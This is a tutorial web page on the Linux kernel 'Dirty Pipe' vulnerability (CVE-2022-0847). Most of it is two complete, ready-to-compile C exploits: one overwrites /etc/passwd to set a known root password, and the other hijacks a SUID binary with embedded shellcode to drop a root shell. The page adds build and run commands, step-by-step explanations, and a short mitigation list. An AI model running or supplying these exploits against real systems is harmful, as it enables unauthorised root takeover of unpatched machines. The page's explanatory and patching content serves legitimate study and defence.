<h2 class="text-2xl font-bold mb-4">ü©∏ CVE-2022-0847: Dirty Pipe</h2>
<p class="text-gray-300 mb-4">Dirty Pipe is a privilege escalation vulnerability in Linux kernel 5.8+ allowing overwrite of read-only files by unprivileged users.</p>

<ul class="list-disc ml-6 text-gray-400 space-y-2 mb-6">
  <li>Impact: Local Privilege Escalation</li>
  <li>Vector: Pipe buffer flags mismanagement</li>
  <li>PoC: <a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit" target="_blank" class="text-blue-400 underline">GitHub PoC</a></li>
</ul>

<h3 class="text-xl font-bold text-gray-100 mb-2">üîç What is Dirty Pipe?</h3>
<p class="text-gray-300 mb-4">
Dirty Pipe abuses a flaw in how Linux handles pipe buffers. An attacker can splice read-only files and inject data directly into the page cache‚Äîeven if they don't have write permissions. That allows privilege escalation by modifying protected files like <code>/etc/passwd</code> or hijacking SUID binaries.
</p>

<h3 class="text-xl font-bold text-gray-100 mb-2">üß™ Test Environment Requirements</h3>
<ul class="list-disc ml-6 text-gray-400 space-y-2 mb-6">
  <li>Linux Kernel 5.8 or newer</li>
  <li>gcc compiler and root access for testing</li>
  <li>Tested SUID binary (e.g., <code>/usr/bin/su</code>)</li>
</ul>

<h3 class="text-xl font-bold text-gray-100 mb-2">‚öôÔ∏è Step 1: Prepare Exploit Files</h3>

<h4 class="text-lg font-semibold text-gray-100 mt-4 mb-2">üìÑ compile.sh</h4>
<pre class="bg-gray-900 text-green-400 text-sm p-4 rounded overflow-x-auto whitespace-pre-wrap">
#!/bin/bash
gcc exploit-1.c -o exploit-1
gcc exploit-2.c -o exploit-2
</pre>

<h4 class="text-lg font-semibold text-gray-100 mt-4 mb-2">üìÑ exploit-1.c (Modify /etc/passwd)</h4>
<p class="text-gray-300 mb-2">This version replaces the root password with "piped".</p>
<pre class="bg-gray-900 text-green-400 text-sm p-4 rounded overflow-x-auto whitespace-pre-wrap">
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main() {
	const char *const path = "/etc/passwd";

        printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
        printf("Setting root password to \"piped\"...\n");
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

        printf("system() function call seems to have failed :(\n");
	return EXIT_SUCCESS;
}
</pre>

<h4 class="text-lg font-semibold text-gray-100 mt-4 mb-2">üìÑ exploit-2.c (Hijack SUID Binary)</h4>
<p class="text-gray-300 mb-2">This version overwrites a SUID binary (e.g., /usr/bin/su) with a root shell payload, then restores it.</p>
<pre class="bg-gray-900 text-green-400 text-sm p-4 rounded overflow-x-auto whitespace-pre-wrap">
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
    /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};
/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}
int hax(char *filename, long offset, uint8_t *data, size_t len) {
    /* open the input file and validate the specified offset */
    const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return -1;
    }
    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        return -1;
    }
    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);
    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return -1;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return -1;
    }
    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, len);
    if (nbytes < 0) {
        perror("write failed");
        return -1;
    }
    if ((size_t)nbytes < len) {
        fprintf(stderr, "short write\n");
        return -1;
    }
    close(fd);
    return 0;
}
int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s SUID\n", argv[0]);
        return EXIT_FAILURE;
    }
    char *path = argv[1];
    uint8_t *data = elfcode;
    int fd = open(path, O_RDONLY);
    uint8_t *orig_bytes = malloc(sizeof(elfcode));
    lseek(fd, 1, SEEK_SET);
    read(fd, orig_bytes, sizeof(elfcode));
    close(fd);
    printf("[+] hijacking suid binary..\n");
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }
    printf("[+] dropping suid shell..\n");
    system(path);
    printf("[+] restoring suid binary..\n");
    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }
    printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
    system("/tmp/sh");
    return EXIT_SUCCESS;
}
</pre>

<h3 class="text-xl font-bold text-gray-100 mb-2">üöÄ Step 2: Compile and Run</h3>
<pre class="bg-gray-900 text-blue-400 text-sm p-4 rounded overflow-x-auto whitespace-pre-wrap">
chmod +x compile.sh
./compile.sh

# For exploit-1 (passwd overwrite):
./exploit-1

# For exploit-2 (hijack SUID):
./exploit-2 /usr/bin/su
</pre>

<h3 class="text-xl font-bold text-gray-100 mb-2">üõ°Ô∏è Mitigation</h3>
<ul class="list-disc ml-6 text-gray-400 space-y-2 mb-6">
  <li>Patch your kernel (fixed in 5.16.11, 5.15.25, and 5.10.102)</li>
  <li>Set kernel lockdown (if supported)</li>
  <li>Audit permissions and SUID binaries</li>
</ul>

<h3 class="text-xl font-bold text-gray-100 mb-2">üß† Summary for Beginners</h3>
<p class="text-gray-300 mb-4">
Dirty Pipe is a modern-day Dirty COW. It's a local root vulnerability where a non-root user can overwrite protected files, all due to a kernel mishandling pipe buffer flags. PoCs show how easily attackers can gain root access if a system is unpatched.
</p>

<p class="text-gray-300 italic mb-4">Always test responsibly in a safe lab environment!</p>





<h2 class="text-2xl font-bold mb-4">üîç How the Exploit Code Works</h2>
<p class="text-gray-300 mb-4">
  This PoC demonstrates how the Dirty Pipe vulnerability (CVE-2022-0847) is exploited by abusing Linux's pipe buffer behavior to overwrite read-only files like <code>/etc/passwd</code>.
</p>

<h3 class="text-xl font-semibold text-white mb-2">Key Steps in the Exploit</h3>
<ul class="list-decimal ml-6 text-gray-400 space-y-2 mb-6">
  <li><strong>Backup:</strong> First, it backs up <code>/etc/passwd</code> to <code>/tmp/passwd.bak</code> for safe restoration.</li>
  <li><strong>Prepare Pipe:</strong> The <code>prepare_pipe()</code> function fills and drains a pipe to ensure all <code>pipe_buffer</code> flags are set to <code>PIPE_BUF_FLAG_CAN_MERGE</code>.</li>
  <li><strong>Splice Trick:</strong> One byte from before the target offset is spliced into the pipe, adding a page cache reference with the merge flag still set.</li>
  <li><strong>Overwrite:</strong> A crafted string containing a new password hash is written to the pipe. Due to the merge flag, it overwrites the read-only page cache, modifying <code>/etc/passwd</code>.</li>
  <li><strong>Privilege Escalation:</strong> The root user now has a known password ("piped"). The exploit launches a shell with root privileges and restores the original <code>/etc/passwd</code> afterward.</li>
</ul>

<h3 class="text-xl font-semibold text-white mb-2">üìé Code Snippet Reference</h3>
<pre class="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-auto text-sm">
/* Splice 1 byte before offset */
--offset;
splice(fd, &offset, p[1], NULL, 1, 0);

/* Write data into page cache */
write(p[1], data, data_size);
</pre>

<p class="text-gray-400 mb-6">
This works because Linux fails to clear the <code>PIPE_BUF_FLAG_CAN_MERGE</code> when reusing pipe buffers. So a malicious write can target the page cache directly‚Äîeven if the file is marked read-only or immutable.
</p>

<h2 class="text-2xl font-bold mb-4 mt-10">üíÄ Exploit 2: Hijack SUID Binary with Dirty Pipe</h2>
<p class="text-gray-300 mb-4">
  This version of the exploit, <code>dirtypipez.c</code>, leverages CVE-2022-0847 to hijack a SUID binary (e.g., <code>/usr/bin/su</code>) and overwrite its content with a minimal SUID shell dropper, gaining root privileges.
</p>

<h3 class="text-xl font-semibold text-white mb-2">üìå How It Works</h3>
<ul class="list-decimal ml-6 text-gray-400 space-y-2 mb-6">
  <li>
    A small shell-spawning ELF payload is stored in the <code>elfcode[]</code> array. It creates a root-owned, SUID shell at <code>/tmp/sh</code>.
  </li>
  <li>
    The original content of the SUID binary is backed up by reading it before overwriting.
  </li>
  <li>
    Using the Dirty Pipe trick, the binary is overwritten at offset 1 (skipping the ELF magic byte to avoid kernel panic).
  </li>
  <li>
    The hijacked binary is executed, dropping a SUID root shell to <code>/tmp/sh</code>.
  </li>
  <li>
    The original content of the SUID binary is restored, minimizing system damage.
  </li>
  <li>
    Finally, <code>/tmp/sh</code> is executed ‚Äî a full root shell!
  </li>
</ul>

<h3 class="text-xl font-semibold text-white mb-2">üß† Important Notes</h3>
<ul class="list-disc ml-6 text-gray-400 space-y-2 mb-6">
  <li>This method is stealthier and leaves fewer traces by restoring the SUID binary.</li>
  <li>It requires that the target SUID binary be owned by root and executable.</li>
  <li>Be cautious: It overwrites binaries, so a crash during the process may brick critical binaries like <code>su</code> or <code>passwd</code>.</li>
</ul>

<h3 class="text-xl font-semibold text-white mb-2">üìé Code Reference</h3>
<pre class="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-auto text-sm">
// Backup first 256 bytes from SUID binary
lseek(fd, 1, SEEK_SET);
read(fd, orig_bytes, sizeof(elfcode));

// Overwrite binary with custom SUID dropper
hax(path, 1, elfcode, sizeof(elfcode));

// Restore original binary after gaining shell
hax(path, 1, orig_bytes, sizeof(elfcode));
</pre>

<p class="text-gray-400">
Check the original repo at <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" target="_blank" class="text-blue-400 underline">AlexisAhmed's GitHub</a> for the full source and variations.
</p>
